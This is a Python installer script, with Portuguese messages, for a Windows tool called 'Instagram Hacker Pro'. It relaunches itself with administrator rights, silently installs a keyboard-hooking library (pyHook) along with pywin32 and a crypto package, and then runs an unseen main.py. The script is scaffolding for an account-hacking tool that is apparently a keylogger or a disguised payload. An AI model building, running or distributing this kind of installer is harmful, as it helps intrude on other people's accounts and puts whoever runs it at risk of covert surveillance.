import os
import sys
import time
import platform
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich.text import Text
import subprocess
import ctypes

console = Console()

BANNER = """
[#00FF00]┌───────────────────────────────────────────────────────────────┐
│[bold #FF00FF] ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ███████╗██╗  ██╗[#00FF00]│
│[bold #FF00FF] ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝██║  ██║[#00FF00]│
│[bold #FF00FF] ██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗█████╗  ███████║[#00FF00]│
│[bold #FF00FF] ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══╝  ██╔══██║[#00FF00]│
│[bold #FF00FF] ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝███████╗██║  ██║[#00FF00]│
│[bold #FF00FF] ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝[#00FF00]│
├───────────────────────────────────────────────────────────────┤
│[bold white] Instagram Hacker Pro - INSTALLER v4.2[/bold white]                     [#00FF00]│
│[bold white] >> Instalação automática de dependências[/bold white]                  [#00FF00]│
└───────────────────────────────────────────────────────────────┘[/#00FF00]
"""

def run_as_admin():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, None, 1)
            sys.exit(0)
        except:
            console.print("[red]Erro: Execução como administrador falhou![/red]")
            sys.exit(1)

def check_dependencies():
    required = {
        'pywin32': 'win32api',
        'pyHook': 'pyHook',
        'pycryptodome': 'Crypto',
        'rich': 'rich',
        'pythoncom': 'pythoncom'
    }
    
    missing = []
    for pkg, imp in required.items():
        try:
            __import__(imp)
        except ImportError:
            missing.append(pkg)
    
    return missing

def install_dependencies(dependencies):
    with Progress() as progress:
        task = progress.add_task("[cyan]Instalando dependências...", total=len(dependencies))
        
        for dep in dependencies:
            progress.update(task, description=f"[cyan]Instalando {dep}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
                progress.update(task, advance=1)
                time.sleep(0.5)
            except subprocess.CalledProcessError:
                progress.update(task, description=f"[red]Falha ao instalar {dep}[/red]")
                time.sleep(2)
                return False
        return True

def main():
    console.print(BANNER)
    
   
    if platform.system() != 'Windows':
        console.print("[red]Erro: Esta ferramenta só funciona no Windows![/red]")
        sys.exit(1)
    
  
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    
    if not is_admin:
        console.print("[yellow]Aviso: Executando como administrador...[/yellow]")
        time.sleep(2)
        run_as_admin()
    
 
    console.print("\n[bold white]Verificando dependências...[/bold white]")
    missing_deps = check_dependencies()
    
    if not missing_deps:
        console.print("[green]✓ Todas dependências já estão instaladas![/green]")
        time.sleep(2)
    else:
        console.print(f"[yellow]Dependências faltando: {', '.join(missing_deps)}[/yellow]")
        console.print("[bold white]Deseja instalar automaticamente? (s/n): [/bold white]", end="")
        choice = input().lower()
        
        if choice == 's':
            if install_dependencies(missing_deps):
                console.print("[green]✓ Todas dependências instaladas com sucesso![/green]")
                time.sleep(2)
            else:
                console.print("[red]Erro: Falha ao instalar dependências![/red]")
                sys.exit(1)
        else:
            console.print("[red]Instalação cancelada![/red]")
            sys.exit(0)
    
   
    if not os.path.exists("main.py"):
        console.print("[red]Erro: Arquivo main.py não encontrado![/red]")
        sys.exit(1)
    
   
    console.print("\n[bold green]Iniciando Instagram Hacker Pro...[/bold green]")
    time.sleep(2)
    os.system(f'"{sys.executable}" main.py')

if __name__ == "__main__":
    main()
